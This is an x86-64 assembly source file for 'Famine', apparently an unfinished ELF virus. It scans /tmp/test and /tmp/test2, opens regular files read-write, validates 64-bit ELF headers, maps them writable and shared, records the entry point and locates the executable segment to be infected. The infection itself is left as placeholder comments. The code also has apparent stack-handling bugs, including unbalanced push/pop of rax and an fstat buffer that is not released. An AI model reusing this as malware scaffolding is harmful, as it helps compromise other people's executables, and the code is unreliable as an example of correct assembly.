%include "inc/famine.inc"

default rel

section .text
    ; Trazas
    hello db            "[+] Hello",10,0  ;11
    dir db              "[+] dir",10,0  ;9

    global _start
    dirs db         "/tmp/test",0,"/tmp/test2",0,0

    _start:
    ; this trick allows us to access Famine members using the VAR macro
    mov rbp, rsp
    sub rbp, Famine_size            ; allocate Famine struct on stack

    ;load dirs
    lea rdi, [dirs]

    .open_dir:

        ; save dirname pointer to iterate after
        mov VAR(Famine.dir_name_pointer), rdi

        ; if (dirname == NULL), end
        cmp byte [rdi], 0
        je .exit

        ; open(rdi, O_RDONLY | O_DIRECTORY);
        mov rsi, O_RDONLY | O_DIRECTORY
        mov rax, SC_OPEN
        syscall
        test rax, rax
        jl .next_dir

        ; save fd
        mov VAR(Famine.fd_dir), rax

        ; get directory entry
        .dirent:

            ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
            mov rdi, VAR(Famine.fd_dir)
            lea rsi, VAR(Famine.dirent_struc)
            mov rdx, 1024
            mov rax, SC_GETDENTS64
            syscall
            test rax, rax
            jle .close_dir

            xor r12, r12

        ; getdents64 does not return one directory entry. It returns as many directory entries as it can
        ; fit in the buffer passed. This is why the following iteration checks N directory entries and not just one.

        ; rdi = dirent_struct[0]
        ; r12 = offset from dirent_struct[0]
        ; rax = total bytes read in getdents
        .check_for_files_in_dirents:

            ; if offset == total_bytes, next entry.
            cmp r12, rax
            jge .dirent

            ; shift offset from the start of the dirent struct array
            lea rdi, VAR(Famine.dirent_struc)
            add rdi, r12

            ; add lenght of directory entry to offset
            movzx ecx, word [rdi + dirent.d_len]
            add r12, rcx

            ; check if the file is DT_REG
            cmp byte [rdi + dirent.d_type], DT_REG
            jne .check_for_files_in_dirents
        
            add rdi, dirent.d_name

            .openat:
                ; ?? pq se pushea el rax aqui ?
                push rax

                ; openat(fd_dir, d_name (&rsi), O_RDWR);
                lea rsi, [rdi]
                mov rdi, VAR(Famine.fd_dir)
                mov rdx, O_RDWR
                mov rax, SC_OPENAT
                syscall
                test rax, rax
                jle .skip_file

                mov VAR(Famine.fd_file), rax

            .fstat:

                sub rsp, 144                ;fstat struct buffer
                mov rdi, rax
                lea rsi, [rsp]
                mov rax, SC_FSTAT
                syscall
                test rax, rax
                jl .end_fstat

                ; file type
                mov eax, dword [rsp + 24]   ; st-mode fstat struct
                and eax, S_IFMT             ; bytes file type
                cmp eax, S_IFREG            ; reg file type
                jne .close_file
                mov rax, [rsp + 48]
                mov VAR(Famine.file_original_len), rax
                jmp .check_ehdr

                .end_fstat:
                    add rsp, 144
                    jmp .close_file

            .check_ehdr:

                ; read(fd_file, rsi, 64);
                mov rdi, VAR(Famine.fd_file)
                sub rsp, Elf64_Ehdr_size        ; alloc sizeof(Elf64_Ehdr) on stack
                lea rsi, [rsp]                  ; rsi = &rsp
                mov rdx, Elf64_Ehdr_size
                mov rax, SC_READ
                syscall

                cmp dword [rsp], MAGIC_NUMBERS           ; magic number
                jne .check_ehdr_error

                cmp byte [rsp + 4], 2     ; EI_CLASS = 64 bits
                jne .check_ehdr_error

                cmp byte [rsp + 5], 1     ; EI_DATA = little endian
                jne .check_ehdr_error

                add rsp, 64
                jmp .mmap

                .check_ehdr_error:
                    add rsp, 64
                    jmp .close_file

            .mmap:
                ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
                mov rdi, 0x0
                mov rsi, VAR(Famine.file_original_len)
                mov rdx, PROT_READ | PROT_WRITE
                mov r10, MAP_SHARED
                mov r8, VAR(Famine.fd_file)
                mov r9, 0x0
                mov rax, SC_MMAP
                syscall
                test rax, rax
                jle .close_file
                mov VAR(Famine.mmap_pointer), rax   ; save mmap_pointer

            .infect:

                mov rbx, [rax + Elf64_Ehdr.e_entry] ; rbx = &(rax + e_entry)
                mov VAR(Famine.original_entry), rbx ; save original_entry

                lea rbx, [rax + Elf64_Ehdr.e_phoff] ; rbx = &(rax + e_phoff)
                mov rbx, [rbx]                      ; rbx = rax + *(rbx)
                add rbx, rax
                movzx eax, word [rax + Elf64_Ehdr.e_phnum]

                ;rax = phnum
                ;rbx = phdr_pointer
                .loop_phdr:
                    cmp rax, 0
                    jle .end_loop_phdr
                    ; lo que sea de rbx

                    cmp dword [rbx], 0x1
                    jne .next_phdr
                    cmp dword [rbx + 4], 0x5 ; (1 << 2) | (1 << 0)
                    jne .next_phdr
                    TRACE_TEXT hello, 11
                    jmp .end_loop_phdr

                .next_phdr:
                    dec rax
                    add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
                    jmp .loop_phdr


                .end_loop_phdr:
                    ; cambiar tamaños
                    ; lo que sea

            .close_file:
                mov rdi, VAR(Famine.fd_file)
                mov rax, SC_CLOSE
                syscall

            ;.end_openat:
            ;    pop rax
                ; jmp .next_file

        ; .next_file:
        ;     cmp r12, rax
        ;     jge .validate_files_types

        .skip_file:
            pop rax
            jmp .check_for_files_in_dirents

        .close_dir:
            mov rax, SC_CLOSE
            mov rdi, VAR(Famine.fd_dir)
            syscall

        .next_dir:
            mov rsi, VAR(Famine.dir_name_pointer)

        .find_null:
            lodsb               ; al = *rsi++
            test al, al
            jnz .find_null

            mov rdi, rsi
            cmp byte [rdi], 0   ; find double null
            jnz .open_dir

        .exit:
            mov rax, SC_EXIT
            syscall
